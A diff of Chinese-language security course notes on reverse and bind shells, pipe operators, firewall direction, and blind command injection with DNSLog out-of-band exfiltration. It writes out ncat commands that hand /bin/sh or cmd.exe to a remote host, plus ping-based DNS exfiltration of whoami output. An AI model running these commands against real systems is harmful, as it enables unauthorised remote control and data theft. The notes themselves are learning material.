@@ -1,13 +1,15 @@
 ---
 title: "小迪安全 005：基础入门 - 反弹 Shell、无回显带外、正反向连接、防火墙与文件下载"
-date: 2026-08-09
+date: 2026-08-09T10:00:00
 tags: ["Cybersecurity", "Learning Notes"]
 ---
 
 无图形化下载文件可以用curl wget等
-使用网站工具生成命令 https://forum.ywhack.com/bountytips.php?download](https://forum.ywhack.com/bountytips.php?download
+使用网站工具生成命令 
+https://forum.ywhack.com/bountytips.php?download
 
-##### 命令**| pipe: 把左边命令的输出，交给右边命令作为输入。**
+##### 命令
+**| pipe: 把左边命令的输出，交给右边命令作为输入。**
 ```
 管道符：| (管道符号) ||（逻辑或） &&（逻辑与） &(后台任务符号)
 Windows->          | & || &&
@@ -23,40 +25,48 @@ ping -c 1 127.0.0.1 whoami
 ```
 
 ## I. 正反向代理
+
 正向代理：谁监听 就是要控制谁（本地等着别人来连）
 反向代理：谁监听 就控制对方（别人主动给你，等待东西到）
 #### 1. 正向连接（Bind Shell）
+
 **特点：被控制方监听端口，控制方主动连接。**
-##### Windows 控制 Linux*Linux 被控制端：*
+##### Windows 控制 Linux
+*Linux 被控制端：*
 Linux 监听 5566 + 把 /bin/sh 交给这个连接
 ==`ncat -e /bin/sh -lvp 5566`==
 *Windows 控制端：*
 ==`nc <Linux_IP> 5566`==
 连接成功后，Windows 端输入的命令会交给 Linux 的 `/bin/sh` 执行。
 
-##### Linux 控制 Windows*Windows 被控制端：*
+##### Linux 控制 Windows
+*Windows 被控制端：*
 Windows 监听 5566 + 把 cmd.exe 交给这个连接
 `ncat -e cmd.exe -lvp 5566`
 *Linux控制端：*
 `nc <Windows_IP> 5566`
 
-正向连接就是：**被控制方开端口等待，控制方主动连过去。**
+正向连接就是：**==被控制方开端口等待，控制方主动连过去。==**
 
 ### 2. 反向连接（Reverse Shell）
+
 **特点：控制方监听，被控制方主动连接出去，并把自己的 Shell 带过去。**
 
-#### Windows 控制 Linux**Linux交出控制权 Windows连接**
+#### Windows 控制 Linux
+**Linux交出控制权，Windows连接**
 Windows 控制端先监听：
 ==nc -lvvp 5566==
 Linux 被控制端主动连接 Windows：
 ==ncat -e /bin/sh <Windows_IP> 5566==
 *把权限（/bin/sh）交给这个windows ip 的 5566端口*
-##### Linux 控制 Windows**Windows交出控制权Linux连接**
+##### Linux 控制 Windows
+**Windows交出控制权，Linux连接**
 Linux 控制端监听：
 ncat -lvvp 5566
 Windows 被控制端主动连接 Linux：
 ncat -e cmd.exe <Linux_IP> 5566
 
+---
 
 正向 Shell：
 控制端找目标机
@@ -66,25 +76,27 @@ ncat -e cmd.exe <Linux_IP> 5566
 
 反向 Shell 更常见的一个原因，就是目标机往往在 **NAT、防火墙、内网** 后面，外部不容易直接主动连进去；但目标机主动向外建立连接通常更容易。
 
-##### 防火墙 & 正反连接1. Windows攻击机
+##### 防火墙 & 正反连接
+1. Windows攻击机
 2. Linux目标
 
-正向连接需要Linux绑定sh到5566之后Windows去访问这个Linux IP,属于入站，容易被防火墙拦住
-反向连接是Linux主动连接Windows的IP, 主动出去不容易被拦住
+==正向连接需要Linux绑定sh到5566之后Windows去访问这个Linux IP,属于入站，容易被防火墙拦住
+反向连接是Linux主动连接Windows的IP, 主动出去不容易被拦住==
 
 
-## II. 数据回显漏洞有，但是数据不回显
+## II. 数据回显
+漏洞有，但是数据不回显
 1. 反弹shell
 2. 带外查询
 
 找一个能ping的url：e24a3l.dnslog.cn
-ping e24a3l.dnslog.cn
-ping whoami.e24a3l.dnslog.cn
+
 ```
+ping e24a3l.dnslog.cn
 ping `whoami`.e24a3l.dnslog.cn
 ```
 
-命令注入漏洞存在，但是网页没有把命令执行结果显示出来时，怎么确认命令执行成功，以及怎么把结果“带出来”。
+==命令注入漏洞存在，但是网页没有把命令执行结果显示出来时，怎么确认命令执行成功，以及怎么把结果“带出来”。==
 ==这种情况通常叫 **无回显 / Blind Command Injection（盲命令注入）**。==
 
 网站存在命令执行漏洞
@@ -97,8 +109,8 @@ whoami 确实在服务器执行了
         ↓
 方法 1：反弹 Shell
 方法 2：DNSLog 带外查询
-n
-#### 1. `whoami` 其实执行成功了(这里是windows服务器内部， 这里在展示)
+#### 1. `whoami` 其实执行成功了
+(这里是windows服务器内部， 这里在展示)
 第一张图里老师在 PowerShell 输入：
 
 ```powershell
@@ -119,6 +131,7 @@ iz8nhhgtiuldwtz\administrator
 
 ---
 #### 2. 为什么要用 DNSLog？
+
 比如一个存在漏洞的网站内部实际执行：
 
 ```text
@@ -161,21 +174,18 @@ iz8nhhgtiuldwtz\administrator
 
 可是浏览器什么都看不到。
 
-这就是老师笔记里：
-
-```text
-漏洞有，但是数据不回显
-```
+这就是老师笔记里：==漏洞有，但是数据不回显==
 
 ---
 
 #### 3. DNSLog 就是想办法让服务器主动告诉我们结果
+
 老师先拿到了一个 DNSLog 域名：e24a3l.dnslog.cn
 
 DNSLog 的特点是：
 
-如果服务器查询：hello.e24a3l.dnslog.cn
-ping hello.e24a3l.dnslog.cn
+如果服务器查询：`hello.e24a3l.dnslog.cn`
+`ping hello.e24a3l.dnslog.cn`
 
 DNSLog 网站就能看到：
 
@@ -214,6 +224,7 @@ DNSLog 收到 DNS 请求
 ---
 
 #### 4. 为什么老师第一次 `ping` 失败？
+
 这里才是你截图里比较关键的地方。
 
 老师写：$x=whoami
@@ -269,6 +280,7 @@ iz8nhhgtiuldwtz\administrator.e24a3l.dnslog.cn
 ---
 
 #### 5. 所以老师用了 `.Replace()`
+
 于是截图第二张里有：
 
 ```powershell
@@ -318,6 +330,7 @@ Windows 会先进行 DNS 查询：
 ---
 
 #### 6. 所以 DNSLog 页面出现了这个记录
+
 你第三张截图里：
 
 ```text
@@ -364,6 +377,7 @@ DNSLog.cn
 ---
 
 #### 7. 为什么用 `ping`？
+
 这里 `ping` 本身不是重点。
 
 重点是：
@@ -411,6 +425,7 @@ iz8nhhgtiuldwtzxxxxadministrator...
 ---
 
 #### 8. 另外一种方法就是你截图里的“反弹 Shell”
+
 老师笔记写：
 
 ```text
